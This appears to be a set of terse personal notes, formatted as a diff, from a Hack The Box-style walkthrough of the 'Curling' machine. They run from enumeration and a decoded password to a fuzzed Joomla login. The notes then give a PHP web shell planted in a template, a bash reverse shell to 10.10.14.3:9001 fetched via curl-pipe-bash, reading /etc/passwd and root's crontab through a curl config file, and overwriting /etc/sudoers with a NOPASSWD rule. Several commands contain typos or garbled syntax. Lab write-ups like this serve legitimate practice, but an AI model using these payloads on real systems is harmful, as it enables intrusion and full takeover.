@@ -1,0 +1,129 @@
+nmap - sC -sV -oA nmap/curling $IP
+IP=10.10.10.150
+http://$IP
+	> "Cewl Curling Site"
+cewl -h
+cewl -w cewl.out $IP #build a list of word based on the http page
+
+*look source code
+< -----> secret.txt >
+
+http:/$IP/secret.txt
+
+joomscan --url http://$IP -ec | tee joomscan.out #joomla vulnerability scanner
+	> joomla version: 3.8.8
+or
+htt://$IP/administrator/manifests/files/joomla.xml #get joomla versions
+
+google joomla core vulnerabilities
+
+base64 -d secret.txt
+#divible by 4
+PW=Curling2018!
+
+echo -n 1 | base64
+# "=" used for padding
+
+http:/$IP
+"Written by Default User"
+
+*use Burp add on of Firefox
+*authenticate to Joomla with false user but $PW
+*get hashed password with Burp
+
+wfuzz -w cewl.out -d 
+
+wfuzz --hl <hide lines> -w cewl.out -d <dest> -c -b <cookie> http://$IP/administrator/index.php
+
+ grep -i floris cewl.out
+
+#once connected to joomla, fist thing to do is try to modify the template, in php, to get code execution
+
+#Template
+create page: PleaseSubscribe.php
+<?php system($_REQUEST['AndComment']); ?>
+
+http://$IP/Templates/protostar/PleaseSubscribe.php?AndComment='whoami'
+#templates are located in protostar: see the source code
+#if whoami execute, it means we have code execution !
+
+vi thanks.sh
+bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'
+
+python -m SimnplHTTPServer 80
+
+http://$IP/Templates/protostar/PleaseSubscribe.php?AndComment=curl $IP/thanks.sh|bash
+
+nc -lvnp 9001
+#listening on port 9001
+
+#get reverse shell !!
+which python
+which python3
+
+python3 -c ímport pty;pty.spawn("/bin/bash")'
+stty raw -echo
+nc -lvnp 9001
+#get real bash function (completion, etc...)
+
+www-data@curling:/home/floris$
+ls -la
+wc -c user.txt
+cat password_backup
+
+export TERM=xterm
+
+xxd -r ~floris/password_backup > 1
+file 1
+bzcat 1 > 2
+file 2
+zcat 2 > 3
+file 3
+bzcat 3 > 4
+file 4
+tar -xf 4
+
+ssh floris@$IP
+cd admin-area/
+ls -al
+cat report
+cat input
+	url = "http://127.0.0.1"
+
+vim input
+	url = "10.10.14.3"
+
+cat report
+	
+vim input
+	url = "file:///etc/passwd"
+	
+watch -n 1 cat report	
+
+vim input
+	url = "file:///var/spool/cron/crontabs/root"
+	
+vim input
+	url = "http://10.10.14.3/sudoers"
+	output = "/etc/sudoers/"
+	user-agent  "ThanksForTheSubscribe/1.0"
+
+cp /etc/sudoers /htb/boxes/curling/www/
+vi /htb/boxes/curling/www/sudoers
+	floris ALL=(ALL:ALL) NOPASSWD
+
+python -m SimpleHTTPServer 80
+	
+cat /var/log
+
+pspy github
+
+cd /opt
+git clone pspsy
+./pspy -d
+./pspy -
+
+
+
+
+
